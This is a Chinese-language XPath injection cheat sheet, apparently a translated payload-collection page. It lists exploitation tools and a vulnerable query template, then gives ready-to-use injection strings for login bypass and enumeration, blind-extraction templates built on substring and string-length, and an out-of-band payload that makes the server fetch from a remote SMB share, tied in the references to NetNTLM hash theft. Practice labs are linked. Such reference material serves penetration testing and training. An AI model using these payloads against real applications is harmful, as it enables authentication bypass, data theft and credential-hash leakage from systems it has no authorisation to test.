# XPath 注入

> XPath 注入是一种攻击技术，用于利用从用户输入构造 XPath（XML 路径语言）查询的应用程序来查询或导航 XML 文档。

## 概要

* [工具](#工具)
* [方法论](#方法论)
    * [盲注攻击](#盲注攻击)
    * [带外攻击](#带外攻击)
* [实验室](#实验室)
* [参考文献](#参考文献)

## 工具

* [orf/xcat](https://github.com/orf/xcat) - 自动化 XPath 注入攻击以检索文档
* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - 高级 XPath 注入工具
* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - 使用预测文本的 xxxpwn 分支
* [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - XPath 注入利用工具

## 方法论

类似于 SQL 注入，你需要正确终止查询：

```ps1
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

### 盲注攻击

1. 字符串长度

    ```sql
    and string-length(account)=SIZE_INT
    ```

2. 使用 `substring` 访问字符，并使用 `codepoints-to-string` 函数验证其值

    ```sql
    substring(//user[userid=5]/username,2,1)=CHAR_HERE
    substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
    ```

### 带外攻击

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## 实验室

* [Root Me - XPath 注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
* [Root Me - XPath 注入 - 字符串](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
* [Root Me - XPath 注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)

## 参考文献

* [盗取 NetNTLM 哈希的地方 - Osanda Malith Jayathissa - 2017 年 3 月 24 日](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
* [XPath 注入 - OWASP - 2015 年 1 月 21 日](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))